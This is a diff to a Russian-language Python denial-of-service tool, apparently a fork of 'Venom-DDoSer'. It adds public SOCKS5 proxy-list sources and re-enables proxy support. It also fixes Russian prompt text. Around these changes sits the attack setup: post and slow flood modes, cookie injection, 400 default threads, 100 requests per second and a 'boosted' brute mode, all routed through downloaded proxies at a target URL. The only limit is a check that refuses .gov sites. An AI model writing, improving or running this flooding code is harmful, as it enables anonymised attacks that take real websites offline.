@@ -1,7 +1,7 @@
 
 import requests
 import socket
-#import socks
+import socks
 import time
 import random
 import threading
@@ -201,13 +201,13 @@ def InputOption(question,options,default):
 
 def CheckerOption():
 	global proxies
-	N = str(input("- Скачать новый список прокси?(y/n, станyртно=y):"))
-	if N == 'y' or N == "" :
+	N = str(input("- Скачать новый список прокси?(да/нет, стандартно=да):"))
+	if N == 'да' or N == "" :
 		downloadsocks(choice)
 	else:
 		pass
 	if choice == "4":
-		out_file = str(input("- Название файла с прокси (по станyрту socks4.txt):"))
+		out_file = str(input("- Название файла с прокси (по стандарту socks4.txt):"))
 		if out_file == '':
 			out_file = str("socks4.txt")
 		else:
@@ -215,23 +215,23 @@ def CheckerOption():
 		check_list(out_file)
 		proxies = open(out_file).readlines()
 	elif choice == "5":
-		out_file = str(input("- Название файла с прокси (по станyрту http.txt):"))
+		out_file = str(input("- Название файла с прокси (по стандарту socks5.txt):"))
 		if out_file == '':
-			out_file = str("http.txt")
+			out_file = str("socks5.txt")
 		else:
 			out_file = str(out_file)
 		check_list(out_file)
 		proxies = open(out_file).readlines()
 	if len(proxies) == 0:
-		print("- У вас n файла с прокси, пожалуйста скачайте")
+		print("- У вас нет файла с прокси, пожалуйста скачайте")
 		sys.exit(1)
 	print ("- Сокеты %s Прокси: %s" %(choice,len(proxies)))
 	time.sleep(0.03)
-	ans = str(input("- Проверить прокси?(y/n, станyртно=y):"))
+	ans = str(input("- Проверить прокси?(да/нет, стандартно=да):"))
 	if ans == "":
-		ans = "y"
-	if ans == "y":
-		ms = str(input("- Время для проверки прокси (секунды, станyртно=5):"))
+		ans = "да"
+	if ans == "да":
+		ms = str(input("- Время для проверки прокси (секунды, стандартно=5):"))
 		if ms == "":
 			ms = int(5)
 		else :
@@ -530,11 +530,11 @@ def check_socks(ms):
 			fp.close()
 			print("- Сохранено в файле socks4.txt.")
 		elif choice == "5":
-			with open("http.txt", 'wb') as fp:
+			with open("socks5.txt", 'wb') as fp:
 				for lines in list(proxies):
 					fp.write(bytes(lines,encoding='utf8'))
 			fp.close()
-			print("- Сохранено в файле http.txt.")
+			print("- Сохранено в файле socks5.txt.")
 			
 def check_list(socks_file):
 	print("- Проверка списка")
@@ -593,14 +593,34 @@ def downloadsocks(choice):
 			pass
 		print("- Прокси успешно скачано, сохранено в файле socks4.txt")
 	if choice == "5":
-		f = open("http.txt",'wb')
+		f = open("socks5.txt",'wb')
 		try:
-			r = requests.get("https://raw.githubusercontent.com/apnem19/Venom-DDoSer/main/http.txt",timeout=5)
+			r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",timeout=5)
+			f.write(r.content)
+		except:
+			pass
+		try:
+			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
+			f.write(r.content)
+		except:
+			pass
+		try:
+			r = requests.get("https://www.proxyscan.io/download?type=socks5",timeout=5)
+			f.write(r.content)
+		except:
+			pass
+		try:
+			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",timeout=5)
+			f.write(r.content)
+		except:
+			pass
+		try:
+			r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",timeout=5)
 			f.write(r.content)
 			f.close()
 		except:
 			f.close()
-		print("- Прокси успешно скачано, сохранено в файле http.txt")
+		print("- Прокси успешно скачано, сохранено в файле socks5.txt")
 def prevent():
 	if '.gov' in url :
 		print("- Атака на правительственные сайты запрещена!")
@@ -620,14 +640,14 @@ def main():
 	prevent()
 	ParseUrl(url)
 	if mode == "post":
-		mode2 = InputOption("> Хотите настроить пост запросы? (y/n, станyртно=n):",["y","n"],"n")
-		if mode2 == "y":
+		mode2 = InputOption("> Хотите настроить пост запросы? (да/нет, стандартно=нет):",["да","нет"],"нет")
+		if mode2 == "да":
 			data = open(str(input("- Введите название файла:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
 			data = ' '.join([str(txt) for txt in data])
-	choice2 = InputOption("- Настроить cookie? (y/n, станyртно=n):",["y","n"],"n")
-	if choice2 == "y":
+	choice2 = InputOption("- Настроить cookie? (да/нет, стандартно=нет):",["да","нет"],"нет")
+	if choice2 == "да":
 		cookies = str(input("Введите cookies:")).strip()
-	choice = InputOption("- Выберите режим сокетов (4/5, станyртно=5):",["4","5"],"5")
+	choice = InputOption("- Выберите режим сокетов (4/5, стандартно=5):",["4","5"],"5")
 	if choice == "4":
 		socks_type = 4
 	else:
@@ -637,9 +657,9 @@ def main():
 		print("> End of process")
 		return
 	if mode == "slow":	
-		thread_num = str(input("> Подключений (станyртно=400):"))
+		thread_num = str(input("> Подключений (стандартно=400):"))
 	else:
-		thread_num = str(input("> Потоки (станyртно=400):"))
+		thread_num = str(input("> Потоки (стандартно=400):"))
 	if thread_num == "":
 		thread_num = int(400)
 	else:
@@ -649,7 +669,7 @@ def main():
 			sys.exit("Ошибка, количество потоков введено не верно")
 	CheckerOption()
 	if len(proxies) == 0:
-		print("- У вас n прокси, пожалуйста скачайте")
+		print("- У вас нет прокси, пожалуйста скачайте")
 		return
 	ind_rlock = threading.RLock()
 	if mode == "slow":
@@ -658,17 +678,17 @@ def main():
 		th.setDaemon(True)
 		th.start()
 	else:
-		multiple = str(input("- Запросов в секунду(станyртно=100):"))
+		multiple = str(input("- Запросов в секунду(стандартно=100):"))
 		if multiple == "":
 			multiple = int(100)
 		else:
 			multiple = int(multiple)
-		brute = str(input("- Включаем усиленный режим?(y/n, default=y):"))
+		brute = str(input("- Включаем усиленный режим?(да/нет, default=да):"))
 		if brute == "":
 			brute = True
-		elif brute == "y":
+		elif brute == "да":
 			brute = True
-		elif brute == "n":
+		elif brute == "нет":
 			brute = False
 		event = threading.Event()
 		print("- Генерирование потоков...")
